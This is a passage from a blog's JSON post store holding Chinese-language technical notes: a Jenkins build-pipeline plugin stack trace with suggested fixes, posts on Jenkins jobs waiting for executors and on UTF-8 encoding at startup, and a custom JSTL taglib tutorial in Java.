hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat org.acegisecurity.ui.basicauth.BasicProcessingFilter.doFilter(BasicProcessingFilter.java:174)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat jenkins.security.ApiTokenFilter.doFilter(ApiTokenFilter.java:79)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat org.acegisecurity.context.HttpSessionContextIntegrationFilter.doFilter(HttpSessionContextIntegrationFilter.java:249)\n\tat hudson.security.HttpSessionContextIntegrationFilter2.doFilter(HttpSessionContextIntegrationFilter2.java:67)\n\tat hudson.security.ChainedServletFilter$1.doFilter(ChainedServletFilter.java:87)\n\tat hudson.security.ChainedServletFilter.doFilter(ChainedServletFilter.java:76)\n\tat hudson.security.HudsonFilter.doFilter(HudsonFilter.java:164)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1482)\n\tat org.kohsuke.stapler.compression.CompressionFilter.doFilter(CompressionFilter.java:46)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1482)\n\tat hudson.util.CharacterEncodingFilter.doFilter(CharacterEncodingFilter.java:81)\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1474)\n\tat org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:499)\n\tat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:137)\n\tat org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:533)\n\tat org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:231)\n\tat org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1086)\n\tat org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:428)\n\tat org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:193)\n\tat org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1020)\n\tat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:135)\n\tat org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:116)\n\tat org.eclipse.jetty.server.Server.handle(Server.java:370)\n\tat org.eclipse.jetty.server.AbstractHttpConnection.handleRequest(AbstractHttpConnection.java:489)\n\tat org.eclipse.jetty.server.AbstractHttpConnection.headerComplete(AbstractHttpConnection.java:949)\n\tat org.eclipse.jetty.server.AbstractHttpConnection$RequestHandler.headerComplete(AbstractHttpConnection.java:1011)\n\tat org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:644)\n\tat org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:235)\n\tat org.eclipse.jetty.server.AsyncHttpConnection.handle(AsyncHttpConnection.java:82)\n\tat org.eclipse.jetty.io.nio.SelectChannelEndPoint.handle(SelectChannelEndPoint.java:668)\n\tat org.eclipse.jetty.io.nio.SelectChannelEndPoint$1.run(SelectChannelEndPoint.java:52)\n\tat winstone.BoundedExecutorService$1.run(BoundedExecutorService.java:77)\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:626)\n\tat java.lang.Thread.run(Thread.java:804)\nCaused by: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/hudson/model/View/index.jelly:42:43: <st:include> org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/lib/hudson/projectView.jelly:66:22: <d:invokeBody> null\n\tat org.apache.commons.jelly.impl.TagScript.handleException(TagScript.java:726)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:281)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript$1.run(CallTagLibScript.java:99)\n\tat org.apache.commons.jelly.tags.define.InvokeBodyTag.doTag(InvokeBodyTag.java:91)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:269)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$1.run(CoreTagLibrary.java:98)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$2.run(CoreTagLibrary.java:105)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript.run(CallTagLibScript.java:120)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript$1.run(CallTagLibScript.java:99)\n\tat org.apache.commons.jelly.tags.define.InvokeBodyTag.doTag(InvokeBodyTag.java:91)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:269)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$2.run(CoreTagLibrary.java:105)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript.run(CallTagLibScript.java:120)\n\tat org.kohsuke.stapler.jelly.CompressTag.doTag(CompressTag.java:44)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:269)\n\tat org.kohsuke.stapler.jelly.JellyViewScript.run(JellyViewScript.java:81)\n\tat org.kohsuke.stapler.jelly.DefaultScriptInvoker.invokeScript(DefaultScriptInvoker.java:63)\n\tat org.kohsuke.stapler.jelly.DefaultScriptInvoker.invokeScript(DefaultScriptInvoker.java:53)\n\tat org.kohsuke.stapler.jelly.JellyClassTearOff.serveIndexJelly(JellyClassTearOff.java:112)\n\t... 63 more\nCaused by: java.lang.RuntimeException: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/lib/hudson/projectView.jelly:66:22: <d:invokeBody> null\n\tat org.kohsuke.stapler.jelly.groovy.JellyBuilder.doInvokeMethod(JellyBuilder.java:280)\n\tat org.kohsuke.stapler.jelly.groovy.Namespace$ProxyImpl.invoke(Namespace.java:92)\n\tat com.sun.proxy.$Proxy56.projectView(Unknown Source)\n\tat lib.JenkinsTagLib$projectView.call(Unknown Source)\n\tat hudson.model.View.main.run(main.groovy:14)\n\tat org.kohsuke.stapler.jelly.groovy.GroovierJellyScript.run(GroovierJellyScript.java:74)\n\tat org.kohsuke.stapler.jelly.groovy.GroovierJellyScript.run(GroovierJellyScript.java:62)\n\tat org.kohsuke.stapler.jelly.IncludeTag.doTag(IncludeTag.java:147)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:269)\n\t... 95 more\nCaused by: org.apache.commons.jelly.JellyTagException: jar:file:/var/cache/jenkins/war/WEB-INF/lib/jenkins-core-1.574.jar!/lib/hudson/projectView.jelly:66:22: <d:invokeBody> null\n\tat org.apache.commons.jelly.impl.TagScript.handleException(TagScript.java:726)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:281)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$1.run(CoreTagLibrary.java:98)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$1.run(ReallyStaticTagLibrary.java:99)\n\tat org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:95)\n\tat org.apache.commons.jelly.tags.core.CoreTagLibrary$2.run(CoreTagLibrary.java:105)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript.run(CallTagLibScript.java:120)\n\tat org.kohsuke.stapler.jelly.groovy.JellyBuilder.doInvokeMethod(JellyBuilder.java:276)\n\t... 103 more\nCaused by: java.lang.NumberFormatException: null\n\tat java.lang.Integer.parseInt(Integer.java:465)\n\tat java.lang.Integer.valueOf(Integer.java:593)\n\tat au.com.centrumsystems.hudson.plugin.buildpipeline.BuildPipelineView.getBuildPipelineForm(BuildPipelineView.java:400)\n\tat au.com.centrumsystems.hudson.plugin.buildpipeline.BuildPipelineView.getItems(BuildPipelineView.java:866)\n\tat au.com.centrumsystems.hudson.plugin.buildpipeline.BuildPipelineView.hasPermission(BuildPipelineView.java:932)\n\tat hudson.model.ViewGroupMixIn.getViews(ViewGroupMixIn.java:115)\n\tat jenkins.model.Jenkins.getViews(Jenkins.java:1444)\n\tat sun.reflect.GeneratedMethodAccessor255.invoke(Unknown Source)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:55)\n\tat java.lang.reflect.Method.invoke(Method.java:618)\n\tat org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:90)\n\tat groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:233)\n\tat groovy.lang.MetaClassImpl$GetBeanMethodMetaProperty.getProperty(MetaClassImpl.java:3500)\n\tat org.codehaus.groovy.runtime.callsite.GetEffectivePojoPropertySite.getProperty(GetEffectivePojoPropertySite.java:61)\n\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.callGetProperty(AbstractCallSite.java:227)\n\tat hudson.model.View.main$_run_closure1.doCall(main.groovy:15)\n\tat sun.reflect.GeneratedMethodAccessor382.invoke(Unknown Source)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:55)\n\tat java.lang.reflect.Method.invoke(Method.java:618)\n\tat org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:90)\n\tat groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:233)\n\tat org.codehaus.groovy.runtime.metaclass.ClosureMetaClass.invokeMethod(ClosureMetaClass.java:272)\n\tat groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:903)\n\tat org.codehaus.groovy.runtime.callsite.PogoMetaClassSite.callCurrent(PogoMetaClassSite.java:66)\n\tat org.codehaus.groovy.runtime.callsite.AbstractCallSite.callCurrent(AbstractCallSite.java:141)\n\tat hudson.model.View.main$_run_closure1.doCall(main.groovy)\n\tat sun.reflect.GeneratedMethodAccessor381.invoke(Unknown Source)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:55)\n\tat java.lang.reflect.Method.invoke(Method.java:618)\n\tat org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:90)\n\tat groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:233)\n\tat org.codehaus.groovy.runtime.metaclass.ClosureMetaClass.invokeMethod(ClosureMetaClass.java:272)\n\tat groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:903)\n\tat groovy.lang.Closure.call(Closure.java:415)\n\tat groovy.lang.Closure.call(Closure.java:409)\n\tat org.kohsuke.stapler.jelly.groovy.JellyBuilder$1.run(JellyBuilder.java:264)\n\tat org.kohsuke.stapler.jelly.CallTagLibScript$1.run(CallTagLibScript.java:99)\n\tat org.apache.commons.jelly.tags.define.InvokeBodyTag.doTag(InvokeBodyTag.java:91)\n\tat org.apache.commons.jelly.impl.TagScript.run(TagScript.java:269)\n\t... 111 more\n```\n\n\n## 解决方案\n1. 重启jenkins服务(自己发现的)\n服务出异常后，发现只要jenkins页面刷新后，jenkins cpu使用率会达到200％+，物理内存占用1.1g，虚拟内存占用2.7g。不知道跟这个异常有没关系。\n\n2. 尝试升级build-pipeline-plugin。\n\n3. 尝试升级jenkins版本。","slug":"article/jenkins/jenkins插件buildpipeline数值解析异常","published":1,"updated":"2016-03-31T15:03:54.000Z","_id":"cilpxkgb0003havbt4ao8qpty","comments":1,"layout":"post","photos":[],"link":""},{"title":"jenkins任务等待下一次可用执行","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\" />\n\n\n英文：pending-waiting for next available executor\n\n## 问题分析\n查阅网上的资料，出现pending-waiting for next available executor的情况主要有二：\n\n### 磁盘存储空间已满\n1. jenkins所在的服务器\n2. 任务运行涉及到的slave服务器\n\n### 节点离线\njenkins服务正常时，master节点有可能处于离线状态。此时，可以进入系统管理->管理节点，查看一下节点状态。\n![节点状态](http://7xkl4i.com1.z0.glb.clouddn.com/jenkins_node_status.png)\n\n\n## 问题解决\n\n### jenkins所在服务器\n重启jenkins服务后，可能需要过段时间节点才会正常加载并工作。\n\n### 任务运行涉及到的slave服务器\n重启过程导致slave服务器连接master失败，可以考虑重启一下jenkins slave服务。\n\n\n## 参考文档\n1. http://stackoverflow.com/questions/15112890/jenkins-not-executing-jobs-pending-waiting-for-next-executor\n2. http://blog.csdn.net/jinhuiyu/article/details/4827051\n","source":"_posts/article/jenkins/jenkins任务等待下一次可用执行.md","raw":"categories:\n  - 持续集成\ntags:\n  - jenkins\n  - issue\ntitle: jenkins任务等待下一次可用执行\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\" />\n\n\n英文：pending-waiting for next available executor\n\n## 问题分析\n查阅网上的资料，出现pending-waiting for next available executor的情况主要有二：\n\n### 磁盘存储空间已满\n1. jenkins所在的服务器\n2. 任务运行涉及到的slave服务器\n\n### 节点离线\njenkins服务正常时，master节点有可能处于离线状态。此时，可以进入系统管理->管理节点，查看一下节点状态。\n![节点状态](http://7xkl4i.com1.z0.glb.clouddn.com/jenkins_node_status.png)\n\n\n## 问题解决\n\n### jenkins所在服务器\n重启jenkins服务后，可能需要过段时间节点才会正常加载并工作。\n\n### 任务运行涉及到的slave服务器\n重启过程导致slave服务器连接master失败，可以考虑重启一下jenkins slave服务。\n\n\n## 参考文档\n1. http://stackoverflow.com/questions/15112890/jenkins-not-executing-jobs-pending-waiting-for-next-executor\n2. http://blog.csdn.net/jinhuiyu/article/details/4827051\n","slug":"article/jenkins/jenkins任务等待下一次可用执行","published":1,"updated":"2016-03-31T15:04:04.000Z","_id":"cilpxkgb4003lavbthxwelj5p","comments":1,"layout":"post","photos":[],"link":""},{"title":"jenkins中文乱码与服务启动","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\" />\n\n\n## 问题描述\n项目构建**最新修改记录**中文乱码。\n\n\n## 问题查看与分析\n首先，查看jenkins管理界面的**系统属性**功能。\n对应URL地址为：http://jenkins.go.sohuno.com/systemInfo\n\n可以看到jenkins启动环境变量file.encoding值为默认的**ISO-8859-1**(Latin-1字符集)。\n不希望jenkins乱码，需要设置其编码方式为UTF-8。(参考：[Jenkins控制台中乱码问题][^1])\n\n\n## 问题解决\n当前jenkins启动命令为：\n``` shell\njava -Djava.awt.headless=true -DJENKINS_HOME=/var/lib/jenkins -jar /usr/lib/jenkins/jenkins.war --logfile=/var/log/jenkins/jenkins.log --webroot=/var/cache/jenkins/war --httpPort=8080 --ajp13Port=8009 --debug=5 --handlerCountMax=100 --handlerCountMaxIdle=20\n```\n\n在启动jenkins时，需要额外添加参数**file.encoding**，并设置其参数值为UTF-8。\n修改后的启动命令如下：\n``` shell\njava -Djava.awt.headless=true -DJENKINS_HOME=/var/lib/jenkins -jar /usr/lib/jenkins/jenkins.war --logfile=/var/log/jenkins/jenkins.log --webroot=/var/cache/jenkins/war --httpPort=8080 --ajp13Port=8009 --debug=5 --handlerCountMax=100 --handlerCountMaxIdle=20 -Dfile.encoding=UTF-8\n```\n\n\n### 扩展说明\n由jenkins启动命令可看出：\n\n1. jenkins安装目录\n/var/lib/jenkins\n\n2. jenkins服务部署代码\n/usr/lib/jenkins/jenkins.war\n\n3. 运行日志\n/var/log/jenkins/jenkins.log\n\n4. jenkins代码部署位置\n/var/cache/jenkins/war\n\n5. jenkins服务端口\nhttp: 8080\najp13: 8009\n\n6. jenkins servlet容器\njenkins服务运行在winstone servlet容器，类似于tomcat, jetty等。\njenkins命令启动接收的参数`--logfile`, `--webroot`, `--httpPort`, `--ajp13Port`等都是winstone的。\n另外，查看了webroot参数对应的目录，发现目录包含类库**winstone.jar**，也可知jenkins可能是放在winstone容器里运行的。\n\n关于winstone可参考：[Winstone Servlet Container v0.9.10][^6]\n\n\n\n[^1]: http://blog.csdn.net/hunterno4/article/details/38424715\n[^2]: http://lee2013.iteye.com/blog/2108612\n[^3]: http://zhidao.baidu.com/question/177248555728533364.html\n[^4]: http://lee2013.iteye.com/blog/2108612\n[^5]: http://www.xuebuyuan.com/2108588.html\n[^6]: http://winstone.sourceforge.net/\n\n","source":"_posts/article/jenkins/jenkins中文乱码与服务启动.md","raw":"categories:\n  - 持续集成\ntags:\n  - jenkins\n  - issue\ntitle: jenkins中文乱码与服务启动\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\" />\n\n\n## 问题描述\n项目构建**最新修改记录**中文乱码。\n\n\n## 问题查看与分析\n首先，查看jenkins管理界面的**系统属性**功能。\n对应URL地址为：http://jenkins.go.sohuno.com/systemInfo\n\n可以看到jenkins启动环境变量file.encoding值为默认的**ISO-8859-1**(Latin-1字符集)。\n不希望jenkins乱码，需要设置其编码方式为UTF-8。(参考：[Jenkins控制台中乱码问题][^1])\n\n\n## 问题解决\n当前jenkins启动命令为：\n``` shell\njava -Djava.awt.headless=true -DJENKINS_HOME=/var/lib/jenkins -jar /usr/lib/jenkins/jenkins.war --logfile=/var/log/jenkins/jenkins.log --webroot=/var/cache/jenkins/war --httpPort=8080 --ajp13Port=8009 --debug=5 --handlerCountMax=100 --handlerCountMaxIdle=20\n```\n\n在启动jenkins时，需要额外添加参数**file.encoding**，并设置其参数值为UTF-8。\n修改后的启动命令如下：\n``` shell\njava -Djava.awt.headless=true -DJENKINS_HOME=/var/lib/jenkins -jar /usr/lib/jenkins/jenkins.war --logfile=/var/log/jenkins/jenkins.log --webroot=/var/cache/jenkins/war --httpPort=8080 --ajp13Port=8009 --debug=5 --handlerCountMax=100 --handlerCountMaxIdle=20 -Dfile.encoding=UTF-8\n```\n\n\n### 扩展说明\n由jenkins启动命令可看出：\n\n1. jenkins安装目录\n/var/lib/jenkins\n\n2. jenkins服务部署代码\n/usr/lib/jenkins/jenkins.war\n\n3. 运行日志\n/var/log/jenkins/jenkins.log\n\n4. jenkins代码部署位置\n/var/cache/jenkins/war\n\n5. jenkins服务端口\nhttp: 8080\najp13: 8009\n\n6. jenkins servlet容器\njenkins服务运行在winstone servlet容器，类似于tomcat, jetty等。\njenkins命令启动接收的参数`--logfile`, `--webroot`, `--httpPort`, `--ajp13Port`等都是winstone的。\n另外，查看了webroot参数对应的目录，发现目录包含类库**winstone.jar**，也可知jenkins可能是放在winstone容器里运行的。\n\n关于winstone可参考：[Winstone Servlet Container v0.9.10][^6]\n\n\n\n[^1]: http://blog.csdn.net/hunterno4/article/details/38424715\n[^2]: http://lee2013.iteye.com/blog/2108612\n[^3]: http://zhidao.baidu.com/question/177248555728533364.html\n[^4]: http://lee2013.iteye.com/blog/2108612\n[^5]: http://www.xuebuyuan.com/2108588.html\n[^6]: http://winstone.sourceforge.net/\n\n","slug":"article/jenkins/jenkins中文乱码与服务启动","published":1,"updated":"2016-03-31T15:03:57.000Z","_id":"cilpxkgb9003pavbtu7xqhaar","comments":1,"layout":"post","photos":[],"link":""},{"title":"自定义taglib","date":"2015-12-29T07:59:00.000Z","_content":"\n<img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\" />\n\n\n## 一、扩展函数库\n在taglib函数类中添加需要的函数randomElement、join等。\n``` java\n/**\n * @description JSTL function ext\n * \n * @author yeshaoting\n * @date 2015-06-29 14:52:57\n */\npublic class FunctionsExt extends Functions {\n  \n  /**\n   * <pre>\n   * jstl's fn:join only works with String[]. This one is more general.\n   * \n   * usage: ${nc:join(values, \", \")}\n   * @see http://stackoverflow.com/questions/3886211/taglib-in-java-tag-with-array-parameter\n   * </pre>\n   */\n  public static String join(Object values, String seperator) {\n    if (values == null)\n      return StringUtils.EMPTY;\n    if (values instanceof Collection<?>)\n      return StringUtils.join((Collection<?>) values, seperator);\n    else if (values instanceof Object[])\n      return StringUtils.join((Object[]) values, seperator);\n    else\n      return values.toString();\n  }\n  \n  /**\n   * get element from elementes by random\n   * \n   * @param elements\n   * @return\n   */\n  public static String randomElement(String[] elements) {\n    if (ArrayUtils.isEmpty(elements)) {\n      return StringUtils.EMPTY;\n    }\n    \n    int index = new Random().nextInt(elements.length);\n    return CollectionUtils.get(elements, index).toString();\n  }\n  \n}\n```\n\n<!-- more -->\n\n\n## 二、创建taglib fn-ext.tld\n放置文件位置：/martinye-demo-spring-web/src/main/webapp/WEB-INF/taglib/fn-ext.tld\n\n参考fn.tld内容修改：\n1. short-name改为我们自己的命令空间fnExt。\n2. uri：http://demo.martinye.com/jsp/jstl/functions-ext\n3. 定义functions，主要修改name, function-class, function-signature\n\n修改后的完整tld内容如下：\n``` xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n\n<taglib xmlns=\"http://java.sun.com/xml/ns/j2ee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xsi:schemaLocation=\"http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd\"\n  version=\"2.0\">\n\n  <description>JSTL 1.1 functions ext library</description>\n  <display-name>JSTL functions ext</display-name>\n  <tlib-version>1.1</tlib-version>\n  <short-name>fnExt</short-name>\n  <uri>http://demo.martinye.com/jsp/jstl/functions-ext</uri>\n\n  <function>\n    <description>\n      get element from elementes by random\n    </description>\n    <name>randomElement</name>\n    <function-class>com.martinye.demo.util.taglib.FunctionsExt</function-class>\n    <function-signature>java.lang.String randomElement(java.lang.String[])</function-signature>\n    <example>\n      &lt;c:if test=\"${fnExt:randomElement(elements)}\">\n    </example>\n  </function>\n  \n  <function>\n    <description>\n      Joins all elements of a collection into a string.\n    </description>\n    <name>join</name>\n    <function-class>com.martinye.demo.util.taglib.FunctionsExt</function-class>\n    <function-signature>java.lang.String join(java.lang.Object, java.lang.String)</function-signature>\n    <example>\n      ${fnExt:join(collection, \";\")}\n    </example>\n  </function>\n\n</taglib>\n```\n\n###  相关说明\n1. 函数式taglib prefix不允许包含特殊字符，标签类taglib可以包含部分特殊字符\n实际操作过程中，遇到不允许包含字符：`-`。\n例如：matinye-fn或者fn-ext这样的prefix都是不对的。\n**注**：有待考证。\n\n2. short-name, uri都要唯一。\n\n3. 当前命令空间fnExt下所有的函数名都不允许重复，即便是重载函数。\n例如：join(array)，join(array, String)不能都同时定义在taglib中。\n\n4. 不允许使用java.util.Collection类型作为参数，使用array或者Object代替。\n**注**：有待考证。\n\n\n## 三、web.xml配置taglib\n``` xml\n  <jsp-config>\n    <taglib>\n      <taglib-uri>http://demo.martinye.com/jsp/jstl/functions-ext</taglib-uri>\n      <taglib-location>/WEB-INF/taglib/fn-ext.tld</taglib-location>\n    </taglib>\n  </jsp-config>\n```\n\n## 四、使用taglib\n\n1. jsp页面定义\n``` xml\n<%@ taglib uri=\"http://demo.martinye.com/jsp/jstl/functions-ext\" prefix=\"fnExt\"%>\n```\n\n2. 页面使用\n``` xml\n${fnExt:join(cdnServers, \" \") }<br/>\n<img src=\"http://${fnExt:randomElement(cdnServerArr) }/resources/img/logo.png\" /><br/>\n```\n\n## 五、参考文档\n[Taglib in Java: tag with array parameter][^1]\n\n\n[^1]: http://stackoverflow.com/questions/3886211/taglib-in-java-tag-with-array-parameter\n","source":"_posts/article/java/自定义taglib.md","raw":"categories:\n  - 后端开发\ntags:\n  - taglib\n  - java\ntitle: 自定义taglib\ndate: 2015-12-29 15:59:00\n---\n\n<img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\" />\n\n\n## 一、扩展函数库\n在taglib函数类中添加需要的函数randomElement、join等。\n``` java\n/**\n * @description JSTL function ext\n * \n * @author yeshaoting\n * @date 2015-06-29 14:52:57\n */\npublic class FunctionsExt extends Functions {\n  \n  /**\n   * <pre>\n   * jstl's fn:join only works with String[]. This one is more general.\n   * \n   * usage: ${nc:join(values, \", \")}\n   * @see http://stackoverflow.com/questions/3886211/taglib-in-java-tag-with-array-parameter\n   * </pre>\n   */\n  public static String join(Object values, String seperator) {\n    if (values == null)\n      return StringUtils.EMPTY;\n    if (values instanceof Collection<?>)\n      return StringUtils.join((Collection<?>) values, seperator);\n    else if (values instanceof Object[])\n      return StringUtils.join((Object[]) values, seperator);\n    else\n      return values.toString();\n  }\n  \n  /**\n   * get element from elementes by random\n   * \n   * @param elements\n   * @return\n   */\n  public static String randomElement(String[] elements) {\n    if (ArrayUtils.isEmpty(elements)) {\n      return StringUtils.EMPTY;\n    }\n    \n    int index = new Random().nextInt(elements.length);\n    return CollectionUtils.get(elements, index).toString();\n  }\n  \n}\n```\n\n<!-- more -->\n\n\n## 二、创建taglib fn-ext.tld\n放置文件位置：/martinye-demo-spring-web/src/main/webapp/WEB-INF/taglib/fn-ext.tld\n\n参考fn.tld内容修改：\n1. short-name改为我们自己的命令空间fnExt。\n2. uri：http://demo.martinye.com/jsp/jstl/functions-ext\n3. 定义functions，主要修改name, function-class, function-signature\n\n修改后的完整tld内容如下：\n``` xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n\n<taglib xmlns=\"http://java.sun.com/xml/ns/j2ee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xsi:schemaLocation=\"http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd\"\n  version=\"2.0\">\n\n  <description>JSTL 1.1 functions ext library</description>\n  <display-name>JSTL functions ext</display-name>\n  <tlib-version>1.1</tlib-version>\n  <short-name>fnExt</short-name>\n  <uri>http://demo.martinye.com/jsp/jstl/functions-ext</uri>\n\n  <function>\n    <description>\n      get element from elementes by random\n    </description>\n    <name>randomElement</name>\n    <function-class>com.martinye.demo.util.taglib.FunctionsExt</function-class>\n    <function-signature>java.lang.String randomElement(java.lang.String[])</function-signature>\n    <example>\n      &lt;c:if test=\"${fnExt:randomElement(elements)}\">\n    </example>\n  </function>\n  \n  <function>\n    <description>\n      Joins all elements of a collection into a string.\n    </description>\n    <name>join</name>\n    <function-class>com.martinye.demo.util.taglib.FunctionsExt</function-class>\n    <function-signature>java.lang.String join(java.lang.Object, java.lang.String)</function-signature>\n    <example>\n      ${fnExt:join(collection, \";\")}\n    </example>\n  </function>\n\n</taglib>\n```\n\n###  相关说明\n1. 函数式taglib prefix不允许包含特殊字符，标签类taglib可以包含部分特殊字符\n实际操作过程中，遇到不允许包含字符：`-`。\n例如：matinye-fn或者fn-ext这样的prefix都是不对的。\n**注**：有待考证。\n\n2. short-name, uri都要唯一。\n\n3. 当前命令空间fnExt下所有的函数名都不允许重复，即便是重载函数。\n例如：join(array)，join(array, String)不能都同时定义在taglib中。\n\n4. 不允许使用java.util.Collection类型作为参数，使用array或者Object代替。\n**注**：有待考证。\n\n\n## 三、web.xml配置taglib\n``` xml\n  <jsp-config>\n    <taglib>\n      <taglib-uri>http://demo.martinye.com/jsp/jstl/functions-ext</taglib-uri>\n      <taglib-location>/WEB-INF/taglib/fn-ext.tld</taglib-location>\n    </taglib>\n  </jsp-config>\n```\n\n## 四、使用taglib\n\n1. jsp页面定义\n``` xml\n<%@ taglib uri=\"http://demo.martinye.com/jsp/jstl/functions-ext\" prefix=\"fnExt\"%>\n```\n\n2. 页面使用\n``` xml\n${fnExt:join(cdnServers, \" \") }<br/>\n<img src=\"http://${fnExt:randomElement(cdnServerArr) }/resources/img/logo.png\" /><br/>\n```\n\n## 五、参考文档\n[Taglib in Java: tag with array parameter][^1]\n\n\n[^1]: http://stackoverflow.com/questions/3886211/taglib-in-java-tag-with-array-parameter\n","slug":"article/java/自定义taglib","published":1,"updated":"2016-03-31T15:07:52.000Z","_id":"cilpxkgbc003tavbtocfc0gow","comments":1,"layout":"post","photos":[],"link":""},{"title":"tomcat访问系统文件及文件夹","date":"2016-02-28T08:24:00.000Z","_content":"\n<img src=\"/asserts/images/logo/tomcat.png\" class=\"img-logo img-center\" />\n\n\n## 一、进入tomcat目录\n> cd /home/yeshaoting/java/server/tomcat/apache-tomcat-6.0.37\n\n\n## 二、修改web.xml配置\n> vim conf/web.xml\n\n\n## 三、修改listings参数\n找到名为 **default** 的servlet配置。\n``` xml\n    <servlet>\n        <servlet-name>default</servlet-name>\n        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>\n        <init-param>\n            <param-name>debug</param-name>\n            <param-value>0</param-value>\n        